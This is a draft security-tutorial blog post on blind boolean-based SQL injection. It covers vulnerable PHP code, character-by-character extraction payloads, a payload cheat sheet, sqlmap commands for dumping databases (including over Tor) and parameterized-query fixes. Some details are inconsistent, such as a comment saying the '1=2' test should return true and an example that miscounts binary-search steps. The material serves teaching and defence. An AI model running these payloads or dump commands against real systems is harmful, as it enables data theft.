---
title: "SQL Injection — Blind Boolean-Based"
date: 2026-04-15T01:00:01+07:00
draft: true
author: "Andrew"
summary: "Blind Boolean-Based SQL Injection is a technique where attackers investigate the application's response to determine whether a condition is TRUE or FALSE, allowing them to extract data one character at a time."
tags: ["Web Penetration Testing", "SQL Injection", "Blind Boolean-Based"]
categories: ["Web Penetration Testing", "SQL Injection"]
description: ""
---

# Blind Boolean-Based SQL Injection: The Silent Data Thief

You visit a website. Everything looks normal. No errors, no strange messages, no signs of compromise. But somewhere in the shadows, an attacker is slowly extracting your entire database one character at a time. Passwords, credit cards, Social Security numbers, everything, byte by painful byte.

This is Blind Boolean-Based SQL Injection. And it is far more dangerous than it sounds.

Unlike its loud cousin Union-Based SQLi, Blind Boolean SQLi never reveals data directly. It forces the application to tell the truth through true or false answers. The attack is slower, but it works on nearly any SQL injectable endpoint. If your code is vulnerable, the attacker will find a way in.

---

## What Is Blind Boolean-Based SQLi?

Blind Boolean-Based SQL Injection is a technique where an attacker determines whether a condition in a database is true or false by observing the application's behavior. The application does not return database errors or data, it only changes its response based on whether the injected condition evaluates to true or false.

Think of it as a game of 20 questions with a lying database. The attacker asks yes/no questions and watches for subtle differences in the application's response: different HTML content, different HTTP status codes, different response times, or different JavaScript behavior.

The key difference from other SQLi types:

- **Union-Based SQLi** retrieves data directly through UNION statements
- **Error-Based SQLi** retrieves data through error messages
- **Blind Boolean-Based SQLi** extracts data through true/false responses
- **Time-Based Blind SQLi** uses database delays to infer true/false

---

## How It Works: The ASCII Attack Flow Diagram

The attacker exploits an injectable parameter by injecting boolean conditions. The application responds differently depending on whether the condition is true or false.

Here is the complete attack flow for extracting a password character by character:

```
ATTACKER                                        WEB APPLICATION                          DATABASE
  |                                                   |                                       |
  |  [1] Initial Request                              |                                       |
  |  GET /user?id=1                                   |                                       |
  |-------------------------------------------------->|  SELECT * FROM users WHERE id=1       |
  |                                                   |------------------------------------->|
  |                                                   |                              [Returns user record]
  |                                                   |<-------------------------------------|
  |  [Normal response - user exists]                  |                                       |
  |<--------------------------------------------------|                                       |
  |                                                   |                                       |
  |  [2] Boolean Test - First Char of password = 'a'  |                                       |
  |  GET /user?id=1' AND ASCII(SUBSTRING(             |                                       |
  |       (SELECT password FROM users                 |                                       |
  |        WHERE username='admin'),1,1) = 97 --       |                                       |
  |-------------------------------------------------->|                                       |
  |                                                   |  SELECT * FROM users WHERE id=1       |
  |                                                   |   AND ASCII(SUBSTRING(...)) = 97     |
  |                                                   |------------------------------------->|
  |                                                   |                    [FALSE - 'a' != password[1]]
  |                                                   |<-------------------------------------|
  |  [False Response - Different HTML or status]      |                                       |
  |<--------------------------------------------------|                                       |
  |                                                   |                                       |
  |  [3] Boolean Test - First Char = 'b'              |                                       |
  |  GET /user?id=1' AND ASCII(SUBSTRING(             |                                       |
  |       (SELECT password FROM users                 |                                       |
  |        WHERE username='admin'),1,1) = 98 --       |                                       |
  |-------------------------------------------------->|                                       |
  |                                                   |  SELECT * FROM users WHERE id=1       |
  |                                                   |   AND ASCII(SUBSTRING(...)) = 98     |
  |                                                   |------------------------------------->|
  |                                                   |                     [TRUE - 'b' == password[1]]
  |                                                   |<-------------------------------------|
  |  [True Response - Same as normal]                  |                                       |
  |<--------------------------------------------------|                                       |
  |                                                   |                                       |
  |  [4] Confirmed: password[1] = 'b'                  |                                       |
  |      Move to next character position...           |                                       |
  |                                                   |                                       |
  v                                                   v                                       v


CHARACTER-BY-CHARACTER EXTRACTION PROCESS
==========================================

Position 1:  ASCII Range 32-126 (searching for 'b')
+-----------+----------+----------+------------------+
| Character | ASCII    | Query    | Response         |
+-----------+----------+----------+------------------+
| a         | 97       | = 97     | FALSE            |
| b         | 98       | = 98     | TRUE  <-- FOUND  |
| c         | 99       | = 99     | FALSE            |
| ...       | ...      | ...      | ...              |
+-----------+----------+----------+------------------+

Position 2:  ASCII Range 32-126 (searching for 'a')
+-----------+----------+----------+------------------+
| Character | ASCII    | Query    | Response         |
+-----------+----------+----------+------------------+
| a         | 97       | = 97     | TRUE  <-- FOUND  |
| b         | 98       | = 98     | FALSE            |
| ...       | ...      | ...      | ...              |
+-----------+----------+----------+------------------+

... continues until full password is extracted

Result: "baN4#mK9xYq@"  (12 characters, each requiring
                         up to 95 queries = ~1,140 requests)
```

### BINARY SEARCH OPTIMIZATION

Smart attackers use binary search to reduce the number of requests from 95 to just 7 per character:

```
BINARY SEARCH FOR CHARACTER 'b' (ASCII = 98)
=============================================

Step 1:  Is ASCII > 63?  YES (98 > 63)
         Range: 64-126

Step 2:  Is ASCII > 95?  YES (98 > 95)
         Range: 96-126

Step 3:  Is ASCII > 111? NO (98 < 111)
         Range: 96-110

Step 4:  Is ASCII > 103? NO (98 < 103)
         Range: 96-102

Step 5:  Is ASCII > 99?  NO (98 < 99)
         Range: 96-98

Step 6:  Is ASCII > 97?  YES (98 > 97)
         Range: 98-98

Result: ASCII 98 = 'b'  (6 requests vs 95 requests)
```

---

## Vulnerable Code Example

The following examples show PHP code vulnerable to Blind Boolean-Based SQLi.

### Vulnerable PHP Code

```php
<?php
// VULNERABLE CODE - DO NOT USE
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = " . $id;
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    echo "User found";
} else {
    echo "User not found";
}
?>
```

The application returns "User found" for valid IDs and "User not found" for invalid IDs. This is all an attacker needs.

Attack payload for extracting the database version:

```php
<?php
// Attacker sends this as the 'id' parameter:

// Step 1: Confirm vulnerability - both queries should return true
id=1' AND 1=1 --
id=1' AND 1=2 --

// Step 2: Extract database version using substring and ASCII
id=1' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64 --

// Step 3: Binary search each character
id=1' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 95 --
id=1' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 111 --
id=1' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 103 --
id=1' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 99 --
id=1' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 96 --
// Repeat until single character identified
```

### Vulnerable Login Authentication

```php
<?php
// VULNERABLE - Blind Boolean in authentication
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    // Login successful
    header("Location: dashboard.php");
} else {
    // Login failed - same message for both wrong user and wrong password
    echo "Invalid credentials";
}
?>
```

The attacker can determine valid usernames by observing which payloads cause a delay or change in response.

---

## Impact Table

| Severity | Impact Area | Description |
|----------|-------------|-------------|
| **Critical** | Full Database Dump | Attackers can extract all data from all tables |
| **Critical** | Authentication Bypass | Login as any user without knowing password |
| **Critical** | Credential Theft | Extract usernames and password hashes |
| **High** | Data Manipulation | Modify or delete database records |
| **High** | Server Compromise | In some cases, execute OS commands via xp_cmdshell or similar |
| **Medium** | Availability Impact | Resource exhaustion through repeated queries |
| **High** | Compliance Violation | GDPR, PCI-DSS, HIPAA breaches |
| **Critical** | Reputation Damage | Public disclosure of breach |
| **High** | Legal Liability | Regulatory fines and lawsuits |

### Real-World Attack Scenario

1. Attacker finds a search parameter that reflects input in the response
2. Attacker confirms blind boolean injection by testing `1=1` vs `1=2`
3. Attacker enumerates database: `1 AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64`
4. Attacker extracts first character through binary search
5. Attacker automates the process to dump entire database
6. Attacker's script extracts 10,000 user records including passwords

---

## How to Detect Blind Boolean SQLi

### Manual Detection Steps

1. **Identify Injectable Parameters**: Find parameters that affect application behavior (GET/POST, headers, cookies)

2. **Confirm Boolean Inference**: Inject true and false conditions and compare responses:
   ```
   # True condition - should return normal response
   /api/user?id=1 AND 1=1

   # False condition - should return different response
   /api/user?id=1 AND 1=2
   ```

3. **Test for Time Delays** (if boolean inference is unclear):
   ```
   /api/user?id=1; WAITFOR DELAY '00:00:05'--
   ```

4. **Enumerate Data**: Extract data character by character using boolean conditions

### Automated Detection with SQLMap

SQLMap automates blind boolean-based SQLi detection and exploitation.

```bash
# Basic detection on a single URL
sqlmap -u "http://target.com/user?id=1"

# Specify injectable parameter
sqlmap -u "http://target.com/user?id=1" -p id

# Specify request method and data
sqlmap -u "http://target.com/login" --data="username=admin&password=test" -p username

# Extract database banner
sqlmap -u "http://target.com/user?id=1" --banner

# List all databases
sqlmap -u "http://target.com/user?id=1" --dbs

# Dump all data from identified database
sqlmap -u "http://target.com/user?id=1" -D vulndb --dump

# Extract specific table
sqlmap -u "http://target.com/user?id=1" -D vulndb -T users --dump

# Use HTTP cookie (for authenticated scanning)
sqlmap -u "http://target.com/user?id=1" --cookie="PHPSESSID=abc123"

# Use Tor for anonymity
sqlmap -u "http://target.com/user?id=1" --tor --tor-type=SOCKS5

# Risk level and verbosity
sqlmap -u "http://target.com/user?id=1" -v 3 --risk=3

# Batch mode (non-interactive)
sqlmap -u "http://target.com/user?id=1" --batch --smart
```

### SQLMap Output Example

```
[INFO] testing connection to the target URL
[CRITICAL]  parameter 'id' might be injectable (blind boolean)
[INFO] testing boolean-based blind SQL injection
[INFO] confirming boolean-based blind SQL injection
[INFO] the back-end DBMS is MySQL
[INFO] fetching banner
[INFO] the back-end DBMS banner is 'MySQL 5.7.32'
[INFO] fetching current database
[INFO] the current database is 'webapp'
[CRITICAL] SQLi vulnerability identified on parameter 'id'
```

### Burp Suite Detection

1. **Intercept Request**: Configure Burp Suite proxy and capture a request
2. **Send to Repeater**: Right-click and send to Repeater
3. **Test Manually**: Modify parameter values with boolean payloads
4. **Compare Responses**: Look for differences in status code, length, or content
5. **Use Intruder**: Configure a pitchfork attack with character sets for automated extraction

Burp Suite Professional also includes an Active Scan feature that automatically detects blind SQLi vulnerabilities.

---

## Mitigation

### Secure Code Example: Parameterized Queries

The only effective mitigation is to use parameterized queries (prepared statements) for all database interactions.

```php
<?php
// SECURE CODE - Using Prepared Statements

// Get user by ID (integer)
$id = $_GET['id'];

// Validate input is numeric
if (!is_numeric($id)) {
    http_response_code(400);
    echo "Invalid ID";
    exit;
}

$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
    echo "User found";
} else {
    echo "User not found";
}
?>
```

### Secure Code Example: Login with Proper Hashing

```php
<?php
// SECURE CODE - Proper Authentication

$username = $_POST['username'];
$password = $_POST['password'];

// Use prepared statement
$stmt = $conn->prepare("SELECT id, username, password_hash FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows === 1) {
    $row = $result->fetch_assoc();

    // Verify password against hash
    if (password_verify($password, $row['password_hash'])) {
        // Login successful - use secure session management
        session_start();
        $_SESSION['user_id'] = $row['id'];
        $_SESSION['username'] = $row['username'];

        header("Location: dashboard.php");
        exit;
    }
}

// Generic error message - do not reveal which field is wrong
echo "Invalid credentials";
?>
```

### Comparison: Vulnerable vs Secure

| Aspect | Vulnerable Code | Secure Code |
|--------|-----------------|-------------|
| Query Construction | String concatenation | Prepared statements |
| User Input | Directly in query | Bound as parameter |
| Type Handling | Manual (error-prone) | Automatic via bind_param |
| SQLi Protection | None | Complete |
| Code Clarity | Simple but dangerous | Slightly more verbose, safe |
| Maintenance | High risk | Low risk |

### Additional Mitigation Layers

1. **Input Validation**: Validate all input against expected patterns
2. **Least Privilege**: Database users should have minimal required permissions
3. **Web Application Firewall (WAF)**: Block known SQLi attack patterns
4. **Error Handling**: Never expose database errors to end users
5. **Monitoring**: Log and alert on suspicious query patterns
6. **Regular Security Audits**: Scan code and running applications

```php
<?php
// ADDITIONAL SECURITY - Input Validation Layer

function sanitize_integer($value) {
    return filter_var($value, FILTER_VALIDATE_INT);
}

function sanitize_string($value, $max_length = 255) {
    $value = trim($value);
    $value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    return substr($value, 0, $max_length);
}

function validate_email($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL);
}

// Usage in secure code
$id = sanitize_integer($_GET['id'] ?? '');
if ($id === false) {
    http_response_code(400);
    exit;
}
?>
```

---

## Cheat Sheet Table

| Category | Payload | Purpose |
|----------|---------|---------|
| **Confirmation** | `1=1` | Test if parameter is injectable |
| **Confirmation** | `1=2` | Confirm by false condition |
| **Comment** | `--` | MySQL comment terminator |
| **Comment** | `#` | MySQL inline comment |
| **Comment** | `/* */` | Multi-line comment |
| **Substring** | `SUBSTRING(str, pos, len)` | Extract character at position |
| **Substring** | `MID(str, pos, len)` | MySQL alternative |
| **Substring** | `SUBSTR(str, pos, len)` | Oracle/MySQL alternative |
| **ASCII** | `ASCII(char)` | Get ASCII value of character |
| **ASCII** | `ORD(char)` | MySQL alternative |
| **Length** | `LENGTH(str)` | Get string length |
| **Length** | `CHAR_LENGTH(str)` | Character count (Unicode-safe) |
| **Database** | `DATABASE()` | Get current database name |
| **Version** | `@@VERSION` | Get MySQL version |
| **Version** | `VERSION()` | Alternative version query |
| **User** | `CURRENT_USER()` | Get current database user |
| **Tables** | `SELECT table_name FROM information_schema.tables` | List all tables |
| **Columns** | `SELECT column_name FROM information_schema.columns` | List all columns |
| **Condition** | `AND` | Combine conditions |
| **Condition** | `OR` | Alternative condition |
| **True** | `1=1` | Always true |
| **False** | `1=2` | Always false |
| **Sleep** | `SLEEP(5)` | Time-based inference (MySQL) |
| **Sleep** | `BENCHMARK(5000000,MD5(1))` | MySQL time delay alternative |
| **Count** | `COUNT(*)` | Count records |
| **Concat** | `CONCAT(str1, str2)` | Concatenate strings |
| **Concat** | `GROUP_CONCAT()` | Concatenate grouped values |
| **Enum** | `ELT(n, str1, str2, ...)` | Get nth string |
| **Enum** | `MAKE_SET(n, str1, str2, ...)` | Create set from bits |
| **Hex** | `0xHEXVAL` | Hexadecimal representation |
| **Blind** | `AND (SELECT COUNT(*) FROM users) > 0` | Test if table exists |
| **Blind** | `AND SUBSTRING(pwd,1,1)='a'` | Extract password character |

### MySQL-Specific Payloads

```sql
-- Get database name character by character
' AND ASCII(SUBSTRING(DATABASE(),1,1)) > 64 --

-- Get table names from information_schema
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1)) > 64 --

-- Get column names
' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1)) > 64 --

-- Stack multiple queries (if supported)
'; SELECT SLEEP(5); --

-- Get version as integer for fast extraction
' AND @@VERSION LIKE '5%' --
```

### PostgreSQL-Specific Payloads

```sql
-- Cast-based extraction
' AND 1=(SELECT 1 FROM pg_database WHERE datname='postgres' AND ASCII(SUBSTRING(datname,1,1))>64)--

-- Time-based blind
' AND (SELECT pg_sleep(5))--
```

---

## Comparison Table: SQL Injection Types

| Feature | Union-Based | Error-Based | Blind Boolean | Time-Based Blind |
|---------|-------------|-------------|---------------|------------------|
| **Data Retrieval Method** | Direct via UNION | Via error messages | True/False responses | Time delays |
| **Speed** | Fast | Fast | Slow | Very Slow |
| **Visibility** | High | Medium | None | None |
| **Reliability** | High | Medium | High | Medium |
| **Required Conditions** | Multiple rows returned | DB errors displayed | Different responses | Heavy query load |
| **Attack Complexity** | Medium | Medium | High | High |
| **Tools Support** | Excellent | Good | Good | Good |
| **Detection Difficulty** | Easy | Easy | Hard | Hard |
| **Data per Request** | Multiple values | 1-2 values | 1 bit (true/false) | 1 bit |
| **Common Databases** | All | MySQL, Oracle, MSSQL | All | All |
| **OWASP Category** | A03:2021 | A03:2021 | A03:2021 | A03:2021 |

### When to Use Each Type

| Situation | Recommended Type |
|-----------|-------------------|
| Application displays SQL errors | Error-Based SQLi |
| Application returns data directly | Union-Based SQLi |
| Application gives generic responses | Blind Boolean SQLi |
| Application gives same response for all queries | Time-Based Blind SQLi |
| Need to extract data quickly | Union-Based + Error-Based |
| Need to confirm vulnerability exists | Blind Boolean or Time-Based |
| WAF blocks other payloads | Time-Based Blind (often not filtered) |

---

## References

1. **OWASP** - SQL Injection
   https://owasp.org/www-community/attacks/SQL_Injection

2. **OWASP Testing Guide** - Testing for SQL Injection
   https://owasp.org/www-project-web-security-testing-guide/

3. **PortSwigger** - Blind SQL Injection
   https://portswigger.net/web-security/sql-injection/blind

4. **SQLMap** - Automatic SQL Injection Tool
   https://sqlmap.org/

5. **MySQL Documentation** - String Functions
   https://dev.mysql.com/doc/refman/8.0/en/string-functions.html

6. **NIST SP 800-53** - Security and Privacy Controls
   https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final

7. **CWE-89** - SQL Injection
   https://cwe.mitre.org/data/definitions/89.html

8. **SANS Institute** - SQL Injection Attack Defense
   https://www.sans.org/

9. **W3Schools** - SQL Injection Prevention
   https://www.w3schools.com/sql/sql_injection.asp

10. **PHP Manual** - PDO Prepared Statements
    https://www.php.net/manual/en/pdo.prepared-statements.php

---

## Summary

Blind Boolean-Based SQLi is a powerful attack technique that exploits applications which return different responses based on query truth. While slower than other SQLi types, it works against seemingly "secure" applications that never expose errors or data directly.

The attacker's process is methodical: confirm injection through boolean tests, identify the database structure through true/false answers, then extract data character by character using binary search optimization.

The only effective defense is strict adherence to secure coding practices: never concatenate user input into SQL queries. Use parameterized queries exclusively, validate and sanitize all input, implement the principle of least privilege, and consider a Web Application Firewall as an additional layer of defense.

Remember: if your code is vulnerable, the attacker will find out — even without error messages.
